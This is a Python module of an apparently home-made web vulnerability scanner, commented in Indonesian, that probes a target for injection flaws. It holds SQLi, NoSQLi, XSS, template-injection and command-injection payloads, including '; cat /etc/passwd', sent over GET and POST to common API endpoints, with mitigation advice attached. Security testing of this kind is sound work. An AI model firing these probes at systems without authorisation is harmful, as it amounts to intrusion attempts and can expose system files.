"""
A03:2025 - Injection (Universal Multi-Method & Multi-Format)
- GET fuzzing jika ada parameter
- POST fallback (JSON / Form-Data) ke endpoint API universal
- SQLi Error/Boolean/Time, XSS, CMDi, SSTI, NoSQLi
- Async time-based detection dengan akurasi tinggi
"""
import asyncio
import re
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode


# ==========================================
# PAYLOAD CLUSTERS
# ==========================================
SQLI_PAYLOADS = [
    "'", "\"", "')", "\")", "';",
    "1' AND '1", "1' OR '1", "' OR '1'='1",
    "1 AND 1=1", "'; SELECT 1--",
    "1' UNION SELECT NULL--",
]

SQLI_BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 OR 1=1", "1 OR 1=2"),
]

SQLI_TIME_PAYLOADS = [
    ("'; SELECT SLEEP(5)--", 5),
    ("' AND SLEEP(5)--", 5),
    ("' OR SLEEP(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("'; SELECT PG_SLEEP(5)--", 5),
    ("1' AND SLEEP(5) AND '1'='1", 5),
]

SQLI_ERROR_SIGS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql_", "mysql_fetch_array()",
    "mysql_num_rows()", "supplied argument is not a valid mysql",
    "mysqli_sql_exception",
    # PostgreSQL
    "postgresql query failed", "pg_query()",
    "pg::", "syntax error at or near",
    "unterminated quoted string",
    # Oracle
    "ora-01756", "ora-00933", "ora-00921", "ora-00904",
    # SQLite
    "sqlite3.operationalerror", "sqlite error", "sql error",
    # MSSQL
    "unclosed quotation mark",
    "microsoft ole db provider for sql server",
    "odbc sql server driver", "sqlstate",
    # Generic
    "syntax error", "sql syntax", "database error",
]

NOSQL_PAYLOADS = [
    ("[$ne]=1", "not_equal"),
    ("[$gt]=", "greater_than"),
    ("[$regex]=.*", "regex"),
    ("'||'1'=='1", "or_bypass"),
]
NOSQL_ERROR_SIGS = [
    "mongoerror", "bsontypeerror", "e11000 duplicate key",
    "mongoerror", "cast to objectid failed",
]

XSS_PAYLOADS = [
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "javascript:alert(1)",
    "\"onmouseover=alert(1)",
]

CMDI_PAYLOADS = [
    "; id", "| id", "&& id", "|| id",
    "; whoami", "| whoami", "&& whoami",
    "`id`", "$(id)", "; ipconfig", "| ipconfig",
    "; cat /etc/passwd",
]
CMDI_SIGS = [
    r"uid=\d+\([\w\-]+\)\s+gid=\d+",
    r"root:.*?:0:0:",
    r"Windows IP Configuration",
    r"Volume Serial Number",
    r"inet addr:",
    r"Administrator",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${{7*7}}", "49"),
]


# ==========================================
# POST FALLBACK ENDPOINTS
# ==========================================
API_ENDPOINTS = [
    "/api/login", "/api/signin", "/api/auth", "/api/auth/login",
    "/api/search", "/api/query", "/api/v1/query", "/api/v1/search",
    "/api/user", "/api/users", "/api/me", "/api/profile",
    "/api/posts", "/api/items", "/api/data", "/api/v1/data",
    "/api/auth/signin", "/api/register", "/api/signup",
    "/api/comments", "/api/products",
    "/search", "/login", "/query", "/find", "/lookup",
]

FORM_FIELDS = ["search", "query", "id", "user", "username", "q", "keyword", "email", "name"]
JSON_FIELDS = ["search", "query", "id", "user", "username", "name", "keyword"]


# ==========================================
# HELPERS
# ==========================================
def _get_params(url):
    return parse_qs(urlparse(url).query)


def _inject_get(url, param, payload):
    p = urlparse(url)
    q = parse_qs(p.query)
    q[param] = [payload]
    return f"{p.scheme}://{p.netloc}{p.path}?{urlencode(q, doseq=True)}"


def _check_sqli_error(body):
    if not body:
        return None
    body_low = body.lower()
    for sig in SQLI_ERROR_SIGS:
        if sig in body_low:
            return sig
    return None


def _check_nosql_error(body):
    if not body:
        return None
    body_low = body.lower()
    for sig in NOSQL_ERROR_SIGS:
        if sig in body_low:
            return sig
    return None


def _check_cmdi(body):
    if not body:
        return None
    for sig in CMDI_SIGS:
        if re.search(sig, body, re.IGNORECASE):
            return sig
    return None


def _reflects_payload(body, payload):
    """Cek apakah payload muncul mentah di body."""
    if not body or not payload:
        return False
    return payload in body


# ==========================================
# GET SCAN
# ==========================================
async def _scan_get(scanner, params):
    param_list = list(params.keys())
    base = await scanner.baseline()
    base_body = base["body"] if base else ""

    # --- 1. SQLi Error-based ---
    tasks, meta = [], []
    for p in param_list:
        for pl in SQLI_PAYLOADS:
            tasks.append(scanner.aget(_inject_get(scanner.target, p, pl)))
            meta.append((p, pl, "GET"))
    results = await scanner.agather(tasks)
    for (p, pl, _), r in zip(meta, results):
        if not isinstance(r, dict):
            continue
        sig = _check_sqli_error(r.get("body", ""))
        if sig:
            scanner.add_finding(
                "A03: SQL Injection (Error-based)", "HIGH",
                f"Parameter '{p}' rentan SQLi (error-based)",
                mitigation="Gunakan Prepared Statements / Parameterized Queries. Validasi tipe input.",
                evidence=f"Payload: {pl} | Sig: {sig}",
            )
            return True

    # --- 2. SQLi Boolean-based ---
    for p in param_list:
        for tp, fp in SQLI_BOOLEAN_PAIRS:
            rt = await scanner.aget(_inject_get(scanner.target, p, tp))
            rf = await scanner.aget(_inject_get(scanner.target, p, fp))
            if not isinstance(rt, dict) or not isinstance(rf, dict):
                continue
            body_t = rt.get("body", "")
            body_f = rf.get("body", "")
            if not body_t or not body_f:
                continue
            # TRUE mirip baseline, FALSE berbeda signifikan
            len_t, len_f = len(body_t), len(body_f)
            if len_t == len_f:
                continue
            if abs(len_t - len_f) / max(len_t, len_f, 1) > 0.1:  # >10% beda
                # Verifikasi: TRUE harus mirip baseline
                if base_body and abs(len(body_t) - len(base_body)) / max(len(base_body), 1) < 0.2:
                    scanner.add_finding(
                        "A03: SQL Injection (Boolean-based)", "HIGH",
                        f"Parameter '{p}' rentan SQLi (boolean-based)",
                        mitigation="Prepared Statements + tipe data ketat",
                        evidence=f"TRUE={len_t} vs FALSE={len_f} | Payload: {tp}",
                    )
                    return True

    # --- 3. SQLi Time-based ---
    for p in param_list:
        for pl, delay in SQLI_TIME_PAYLOADS:
            t0 = time.time()
            await scanner.aget(_inject_get(scanner.target, p, pl))
            elapsed = time.time() - t0
            if elapsed >= delay - 1.0:
                scanner.add_finding(
                    "A03: SQL Injection (Time-based)", "HIGH",
                    f"Parameter '{p}' rentan SQLi (time-based)",
                    mitigation="Prepared Statements + batasi query time",
                    evidence=f"Payload: {pl} | Delay: {elapsed:.2f}s",
                )
                return True

    # --- 4. NoSQLi ---
    for p in param_list:
        for pl, name in NOSQL_PAYLOADS:
            sep = "&" if "?" in scanner.target else "?"
            r = await scanner.aget(f"{scanner.target}{sep}{p}{pl}")
            if not isinstance(r, dict):
                continue
            sig = _check_nosql_error(r.get("body", ""))
            if sig:
                scanner.add_finding(
                    "A03: NoSQL Injection", "HIGH",
                    f"Parameter '{p}' rentan NoSQLi ({name})",
                    mitigation="Validasi tipe input, tolak operator query ($, {}) dari user",
                    evidence=f"Payload: {pl} | Sig: {sig}",
                )
                return True

    # --- 5. XSS ---
    for p in param_list:
        for pl in XSS_PAYLOADS:
            r = await scanner.aget(_inject_get(scanner.target, p, pl))
            if not isinstance(r, dict):
                continue
            body = r.get("body", "")
            if _reflects_payload(body, pl):
                # Deteksi context
                context = "HTML body"
                if re.search(r"<script[^>]*>.*?" + re.escape(pl), body, re.DOTALL):
                    context = "Inside <script>"
                elif re.search(r'="[^"]*' + re.escape(pl), body):
                    context = "Inside atribut"
                scanner.add_finding(
                    "A03: XSS (Reflected)", "HIGH",
                    f"Parameter '{p}' rentan Reflected XSS",
                    mitigation="HTML-escape output. Terapkan CSP ketat. Validasi input whitelist.",
                    evidence=f"Payload: {pl} | Context: {context}",
                )
                return True

    # --- 6. Command Injection ---
    for p in param_list:
        for pl in CMDI_PAYLOADS:
            r = await scanner.aget(_inject_get(scanner.target, p, pl))
            if not isinstance(r, dict):
                continue
            sig = _check_cmdi(r.get("body", ""))
            if sig:
                scanner.add_finding(
                    "A03: Command Injection", "HIGH",
                    f"Parameter '{p}' rentan Command Injection",
                    mitigation="Jangan pass input ke shell. Gunakan API spesifik. Validasi whitelist.",
                    evidence=f"Payload: {pl} | Sig: {sig}",
                )
                return True

    # --- 7. SSTI ---
    for p in param_list:
        for pl, expected in SSTI_PAYLOADS:
            r = await scanner.aget(_inject_get(scanner.target, p, pl))
            if not isinstance(r, dict):
                continue
            body = r.get("body", "")
            # Harus muncul hasil evaluasi TANPA payload mentah
            if expected in body and pl not in body:
                scanner.add_finding(
                    "A03: SSTI", "HIGH",
                    f"Parameter '{p}' rentan Server-Side Template Injection",
                    mitigation="Jangan render input user sebagai template. Gunakan sandbox.",
                    evidence=f"Payload: {pl} -> Result: {expected}",
                )
                return True

    return False


# ==========================================
# POST SCAN (JSON + FORM)
# ==========================================
async def _scan_post_endpoint(scanner, endpoint, payload, field_name):
    """Test 1 endpoint dengan JSON + form payload."""
    url = scanner.target.rstrip("/") + endpoint

    # --- JSON ---
    json_body = {f: payload for f in JSON_FIELDS}
    r_json = await scanner.apost(url, json=json_body)
    if isinstance(r_json, dict):
        body = r_json.get("body", "")

        sig = _check_sqli_error(body)
        if sig:
            return ("SQLi JSON", sig, url)

        sig = _check_nosql_error(body)
        if sig:
            return ("NoSQLi JSON", sig, url)

        sig = _check_cmdi(body)
        if sig:
            return ("CMDi JSON", sig, url)

        # XSS reflection
        if _reflects_payload(body, payload):
            return ("XSS JSON", payload, url)

        # SSTI
        for pl, expected in SSTI_PAYLOADS:
            if pl == payload and expected in body and pl not in body:
                return ("SSTI JSON", f"{pl}->{expected}", url)

    # --- Form-URL-Encoded ---
    form_body = urlencode({f: payload for f in FORM_FIELDS})
    r_form = await scanner.apost(
        url,
        data=form_body,
        headers_override={"Content-Type": "application/x-www-form-urlencoded"},
    )
    if isinstance(r_form, dict):
        body = r_form.get("body", "")

        sig = _check_sqli_error(body)
        if sig:
            return ("SQLi Form", sig, url)

        sig = _check_cmdi(body)
        if sig:
            return ("CMDi Form", sig, url)

        if _reflects_payload(body, payload):
            return ("XSS Form", payload, url)

    return None


async def _scan_post_fallback(scanner):
    """Kalau tidak ada GET param atau GET gagal, fuzz endpoint API."""
    # Batasi endpoint untuk performa (ambil 8 pertama)
    endpoints_to_try = API_ENDPOINTS[:10]

    # Payload prioritas
    priority_payloads = [
        "'", "\"", "' OR '1'='1", "1' AND SLEEP(5)--",
        "<svg/onload=alert(1)>", "; id", "{{7*7}}",
    ]

    for endpoint in endpoints_to_try:
        for payload in priority_payloads:
            result = await _scan_post_endpoint(scanner, endpoint, payload, "search")
            if result:
                vuln_type, evidence, url = result
                scanner.add_finding(
                    f"A03: {vuln_type} (POST)", "HIGH",
                    f"Endpoint '{endpoint}' rentan {vuln_type} via POST",
                    mitigation=(
                        "Validasi input di server. Gunakan prepared statements untuk SQLi, "
                        "escape output untuk XSS, jangan pass ke shell untuk CMDi."
                    ),
                    evidence=f"Payload: {payload} | Evidence: {evidence[:60]}",
                    url=url,
                )
                return True

    return False


# ==========================================
# MAIN
# ==========================================
async def _run(scanner):
    params = _get_params(scanner.target)

    # --- Phase 1: GET-based ---
    if params:
        found = await _scan_get(scanner, params)
        if found:
            return

    # --- Phase 2: POST fallback (selalu coba) ---
    found = await _scan_post_fallback(scanner)
    if found:
        return

    # --- No vuln found ---
    if params:
        scanner.add_finding(
            "A03: Injection", "SAFE",
            f"Tidak ada injection pada GET param ({', '.join(params.keys())}) & POST fallback",
        )
    else:
        scanner.add_finding(
            "A03: Injection", "SAFE",
            f"Tidak ada GET param & {len(API_ENDPOINTS[:10])} endpoint API diuji aman",
        )


def scan(scanner):
    """Entry point — dipanggil dari cli.py."""
    try:
        asyncio.run(_run(scanner))
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(_run(scanner))
    except Exception as e:
        scanner.add_finding("A03: Injection", "INFO", f"Error: {e}")
